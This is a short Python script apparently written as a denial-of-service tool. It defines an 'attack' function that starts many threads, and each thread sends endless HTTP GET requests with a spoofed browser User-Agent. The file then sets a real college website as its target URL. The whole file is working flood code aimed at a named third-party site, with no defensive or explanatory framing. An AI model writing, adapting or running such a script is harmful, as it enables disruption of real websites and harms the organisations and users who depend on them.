import requests
from threading import Thread
def attack(url,threadcount):
    def ddos():
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
        }
        while True:
            response = requests.get(url, headers=headers)
            print(response.status_code)


    threads = [Thread(target=ddos) for _ in range(threadcount)]
    for thread in threads:
        thread.start()


url = "https://www.devagiricollege.org:443"